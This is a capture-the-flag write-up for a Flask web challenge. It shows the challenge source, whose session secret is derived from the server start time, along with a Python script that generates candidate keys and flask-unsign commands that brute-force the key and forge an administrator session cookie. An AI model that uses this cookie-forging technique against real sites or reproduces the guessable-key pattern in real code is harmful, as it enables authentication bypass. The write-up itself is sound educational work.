

http://chal.competitivecyber.club:9999/

### Solution ###

We are given the source code of the website:

```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, jsonify, abort, redirect, session
import uuid
import os
from datetime import datetime, timedelta
import hashlib
app = Flask(__name__)
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)
flag = os.environ.get('FLAG', "flag{this_is_a_fake_flag}")
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
def is_safe_username(username):
    """Check if the username is alphanumeric and less than 20 characters."""
    return username.isalnum() and len(username) < 20
@app.route('/', methods=['GET', 'POST'])
def main():
    """Handle the main page where the user submits their username."""
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.values['username']
        password = request.values['password']
        if not is_safe_username(username):
            return render_template('index.html', error='Invalid username')
        if not password:
            return render_template('index.html', error='Invalid password')
        if username.lower().startswith('admin'):
            return render_template('index.html', error='Don\'t try to impersonate administrator!')
        if not username or not password:
            return render_template('index.html', error='Invalid username or password')
        uid = uuid.uuid5(secret, username)
        session['username'] = username
        session['uid'] = str(uid)
        return redirect(f'/user/{uid}')
@app.route('/user/<uid>')
def user_page(uid):
    """Display the user's session page based on their UUID."""
    try:
        uid = uuid.UUID(uid)
    except ValueError:
        abort(404)
    session['is_admin'] = False
    return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
@app.route('/admin')
def admin_page():
    """Display the admin page if the user is an admin."""
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
    """
    return status_content
if __name__ == '__main__':
    app.run("0.0.0.0", port=9999)
```
After taking a look at the code we can see that we need to become admin to get the flag.
The authentication mechanism is quite common it depends of flask session tokens.
We can also notice the creation of the key to sign these tokens.
```
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
```
The key depends on the time the server was started.
We are also given a /status endpoint which gives us the difference between the current time and the time between the server's starting time however when i solved the challenge i totally missed this endpoint and decided to use a bruteforce approach.
As the server was restated every 10 minute my bruteforce approach worked.
The idea is to create a wordlist of all the keys possible from my current time we keep subtracting a number and writing it into a file.
Here is my exploit to do so:
```python
from datetime import datetime, timedelta
import hashlib

server_start_time = 20240921183020 # This was my current time when i solved the challenge you can change it to your current time

for i in range (0,10**4):
  server_start_str = server_start_time - i
  secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
  f = open('hash-time-wordlist.txt','a')
  f.write(secure_key+'\n')
  f.close()
```

This code creates a wordlist which we can use to bruteforce the cookie for secret using flask-usign:
```bash
flask-unsign --unsign --no-literal-eval --wordlist hash-time-wordlist.txt -c eyJ1aWQiOiJmNmVlODM5ZS02OWViLTVmMmItODFkZS1hOGZkNWY3ODQ4MDEiLCJ1c2VybmFtZSI6ImFzZCJ9.Zu8Q_g.lmsoSdhv5xXrTdLaVXf7uKb0uoA

[*] Session decodes to: {'uid': 'f6ee839e-69eb-5f2b-81de-a8fd5f784801', 'username': 'asd'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 128 attempts1307a80300c7
b'512e21c1f512b862e6784447f626474f5ff722d6e9b0d89da73c3f17de248cdf'
```
This gives us the secret we need now we can sign a token and get the flag.
```bash
flask-unsign --sign --cookie "{'is_admin': True, 'uid': '02ec19dc-bb01-5942-a640-7099cda78081', 'username': 'administrator'}" --secret '512e21c1f512b862e6784447f626474f5ff722d6e9b0d89da73c3f17de248cdf'

eyJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiMDJlYzE5ZGMtYmIwMS01OTQyLWE2NDAtNzA5OWNkYTc4MDgxIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.ZvDtxA.7HytpWHlG4kE9S-w3Ib7fStZZpI
```




![[Pasted image 20240926165933.png]]


- [https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce)




